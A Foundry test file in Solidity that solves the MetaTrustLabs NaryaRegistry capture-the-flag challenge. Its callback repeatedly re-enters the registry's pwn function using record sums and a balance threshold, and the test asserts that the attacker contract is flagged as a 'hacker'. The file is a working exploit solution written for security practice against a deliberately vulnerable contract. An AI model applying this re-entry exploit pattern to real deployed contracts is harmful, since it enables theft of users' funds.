// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./NaryaRegistry.sol";

/// https://github.com/MetaTrustLabs/ctf/blob/master/NaryaRegistry/contracts/NaryaRegistry.sol

contract NaryaRegistryTest is Test {
    NaryaRegistry internal _registry;

    function setUp() public {
        _registry = new NaryaRegistry();
    }

    function PwnedNoMore(uint256 value) public {
        // balances[sender]: 59425114757512643212878610
        // DA0: 3488
        // 59425114757512643212878610 - 3488 = 59425114757512643212875122
        if (_registry.balanceOf(address(this)) > 0xDA0) {
            // amount >= records1[sender] ||
            // amount >= records2[sender] ||
            // records1[sender] + records2[sender] == amount
            _registry.pwn(_registry.records1(address(this)) + _registry.records2(address(this)));
        }
    }

    function test_attack() public {
        _registry.register();

        _registry.pwn(2);

        _registry.identifyNaryaHacker();

        assertTrue(_registry.isNaryaHacker(address(this)));
    }
}
